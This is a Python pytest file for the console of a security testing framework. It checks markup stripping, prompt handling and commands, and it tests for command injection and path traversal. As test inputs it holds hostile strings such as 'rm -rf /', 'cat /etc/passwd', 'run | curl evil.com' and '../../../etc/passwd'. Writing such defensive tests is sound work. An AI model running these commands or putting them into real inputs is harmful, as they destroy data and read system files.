#!/usr/bin/env python3
"""
# Houdinis Framework - Quantum Cryptography Testing Platform
# Author: Mauro Risonho de Paula Assumpção aka firebitsbr
# Developed by: Human Logic & Coding with AI Assistance (Claude Sonnet 4.5)
# License: MIT

Tests command injection prevention, input validation, and console operations
"""

import pytest
import sys
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from io import StringIO

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.cli import HoudinisConsole, SimpleConsole


class TestSimpleConsole:
    """Test SimpleConsole fallback functionality"""

    def test_simple_console_print(self, capsys):
        """Test simple console removes rich markup"""
        console = SimpleConsole()
        console.print("[red]Error[/red] message")

        captured = capsys.readouterr()
        assert "Error message" in captured.out
        assert "[red]" not in captured.out
        assert "[/red]" not in captured.out

    def test_simple_console_removes_multiple_tags(self, capsys):
        """Test removal of multiple rich tags"""
        console = SimpleConsole()
        console.print("[bold][green]Success[/green][/bold] [yellow]warning[/yellow]")

        captured = capsys.readouterr()
        assert "Success warning" in captured.out
        assert "[bold]" not in captured.out
        assert "[green]" not in captured.out


class TestHoudinisConsole:
    """Test HoudinisConsole security and functionality"""

    @pytest.fixture
    def console(self):
        """Create console instance for testing"""
        return HoudinisConsole(debug=True)

    def test_console_initialization(self, console):
        """Test console initializes correctly"""
        assert console.prompt == "houdini > "
        assert console.current_module is None
        assert console.current_module_name == ""
        assert console.module_manager is not None
        assert console.session_manager is not None

    def test_prompt_update_with_module(self, console):
        """Test prompt updates when module is selected"""
        console.current_module_name = "exploit/rsa_shor"
        console.current_module = Mock()
        console._update_prompt()

        assert "exploit" in console.prompt
        assert "rsa_shor" in console.prompt

    def test_prompt_reset_without_module(self, console):
        """Test prompt resets to default"""
        console.current_module_name = "exploit/test"
        console._update_prompt()

        console.current_module = None
        console.current_module_name = ""
        console._update_prompt()

        assert console.prompt == "houdini > "

    @patch("builtins.open", create=True)
    def test_execute_resource_script_validates_path(self, mock_open, console):
        """Test resource script execution validates paths"""
        # Test path traversal attempt
        with patch.object(console.console, "print") as mock_print:
            console.execute_resource_script("../../../etc/passwd")
            mock_print.assert_called()
            call_args = str(mock_print.call_args)
            assert "Access denied" in call_args or "not found" in call_args

    @patch("pathlib.Path.exists")
    @patch("builtins.open", create=True)
    def test_execute_resource_script_validates_filename(
        self, mock_open, mock_exists, console
    ):
        """Test resource script validates filename"""
        mock_exists.return_value = True
        mock_open.return_value.__enter__.return_value = StringIO("show modules\n")

        with patch.object(console.console, "print"):
            # Invalid filename with special characters
            console.execute_resource_script("/tmp/test;rm -rf.rc")

    @patch("pathlib.Path.exists")
    @patch("builtins.open", create=True)
    def test_execute_resource_script_skips_comments(
        self, mock_open, mock_exists, console
    ):
        """Test resource script skips comment lines"""
        mock_exists.return_value = True
        script_content = "# This is a comment\nshow modules\n# Another comment\n"
        mock_open.return_value.__enter__.return_value = StringIO(script_content)

        with patch.object(console, "onecmd") as mock_onecmd:
            with patch.object(console.console, "print"):
                console.execute_resource_script("test.rc")
                # Should only execute non-comment lines
                assert mock_onecmd.call_count == 1

    @patch("pathlib.Path.exists")
    @patch("builtins.open", create=True)
    def test_execute_resource_script_enforces_length_limit(
        self, mock_open, mock_exists, console
    ):
        """Test resource script enforces command length limits"""
        mock_exists.return_value = True
        long_command = "set OPTION " + "A" * 1000
        mock_open.return_value.__enter__.return_value = StringIO(long_command)

        with patch.object(console, "onecmd") as mock_onecmd:
            with patch.object(console.console, "print"):
                console.execute_resource_script("test.rc")
                # Should not execute overly long commands
                mock_onecmd.assert_not_called()

    def test_do_help_shows_main_help(self, console):
        """Test help command shows main help"""
        with patch.object(console, "_show_main_help") as mock_help:
            console.do_help("")
            mock_help.assert_called_once()

    def test_do_show_without_args(self, console):
        """Test show command without arguments"""
        with patch.object(console.console, "print") as mock_print:
            console.do_show("")
            mock_print.assert_called_once()
            assert "Usage" in str(mock_print.call_args)

    def test_do_show_modules(self, console):
        """Test show modules command"""
        with patch.object(console, "_show_modules") as mock_show:
            console.do_show("modules")
            mock_show.assert_called_once_with()

    def test_do_show_scanners(self, console):
        """Test show scanners command"""
        with patch.object(console, "_show_modules") as mock_show:
            console.do_show("scanners")
            mock_show.assert_called_once_with("scanner")

    def test_do_show_exploits(self, console):
        """Test show exploits command"""
        with patch.object(console, "_show_modules") as mock_show:
            console.do_show("exploits")
            mock_show.assert_called_once_with("exploit")

    def test_do_exit_returns_true(self, console):
        """Test exit command returns True to stop loop"""
        with patch.object(console.console, "print"):
            assert console.do_exit("") is True

    def test_do_quit_returns_true(self, console):
        """Test quit command returns True to stop loop"""
        with patch.object(console.console, "print"):
            assert console.do_quit("") is True

    def test_emptyline_returns_false(self, console):
        """Test empty line doesn't exit"""
        assert console.emptyline() is False

    def test_default_unknown_command(self, console):
        """Test unknown command handling"""
        with patch.object(console.console, "print") as mock_print:
            console.default("invalidcommand")
            assert mock_print.call_count >= 1
            call_args = str(mock_print.call_args_list)
            assert "Unknown command" in call_args or "help" in call_args


@pytest.mark.security
class TestSecurityFeatures:
    """Test security features of CLI"""

    @pytest.fixture
    def console(self):
        """Create console for security testing"""
        return HoudinisConsole(debug=False)

    def test_command_injection_prevention(self, console):
        """Test CLI prevents command injection attempts"""
        dangerous_commands = [
            "show modules; rm -rf /",
            "use exploit/test && cat /etc/passwd",
            "set OPTION `whoami`",
            "run | curl evil.com",
        ]

        for cmd in dangerous_commands:
            with patch.object(console.console, "print") as mock_print:
                # The cmdloop should catch these
                result = console.onecmd(cmd)
                # Command should either be blocked or not execute shell commands

    def test_input_length_validation(self, console):
        """Test input length limits"""
        long_input = "A" * 2000

        # This would normally be caught in cmdloop, but we test the concept
        assert len(long_input) > 1000

    def test_path_traversal_in_resource(self, console):
        """Test path traversal protection in resource scripts"""
        with patch.object(console.console, "print") as mock_print:
            console.do_resource("../../../etc/passwd")
            # Should be blocked or not found
            mock_print.assert_called()


@pytest.mark.unit
class TestModuleOperations:
    """Test module-related operations"""

    @pytest.fixture
    def console(self):
        """Create console for module testing"""
        return HoudinisConsole(debug=True)

    def test_module_manager_initialized(self, console):
        """Test module manager is properly initialized"""
        assert console.module_manager is not None
        assert hasattr(console.module_manager, "modules")

    def test_session_manager_initialized(self, console):
        """Test session manager is properly initialized"""
        assert console.session_manager is not None
        assert hasattr(console.session_manager, "sessions")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
